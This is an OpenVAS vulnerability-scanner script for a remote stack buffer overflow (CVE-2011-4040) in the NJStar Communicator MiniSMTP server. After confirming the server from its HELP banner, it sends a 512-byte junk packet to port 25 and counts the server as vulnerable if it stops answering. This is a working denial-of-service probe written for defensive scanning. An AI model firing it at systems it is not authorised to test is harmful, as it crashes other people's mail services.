###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_njstar_communicator_minismtp_server_bof_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# NJStar Communicator MiniSMTP Server Remote Stack Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to execute
arbitrary code within the context of the application or cause a denial of
service condition.

Impact Level: System/Application";

tag_affected = "NJStar Communicator Version 3.00";

tag_insight = "The flaw is due to a boundary error within the MiniSmtp server when
processing packets. This can be exploited to cause a stack-based buffer
overflow via a specially crafted packet sent to TCP port 25.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running NJStar Communicator MiniSMTP Server and is
prone to buffer overflow vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802266");
  script_version("$Revision: 9351 $");
  script_cve_id("CVE-2011-4040");
  script_bugtraq_id(50452);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-11-08 19:46:14 +0530 (Tue, 08 Nov 2011)");
  script_name("NJStar Communicator MiniSMTP Server Remote Stack Buffer Overflow Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46630");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18057");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("smtp_func.inc");

## Get SMTP Port
port = get_kb_item("Services/smtp");
if(!port) {
  port = 25;
}

if(get_kb_item('SMTP/'+port+'/broken')) {
  exit(0);
}

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Open SMTP Socket
if(!soc = smtp_open(port:port)) {
  exit(0);
}

## Get Banner
res = recv(socket:soc, length:512);

## Confirm Application
send(socket:soc, data:'HELP\r\n');
res = recv(socket:soc, length:1024);
if("E-mail Server From NJStar Software" >!< res)
{
  smtp_close(socket:soc);
  exit(0);

}

## Sending Exploit
send(socket:soc, data:crap(512));
smtp_close(socket:soc);

## Open the socket and Check server is dead or alive
if(!soc = smtp_open(port:port))
{
  security_message(port);
  exit(0);
}
smtp_close(socket:soc);
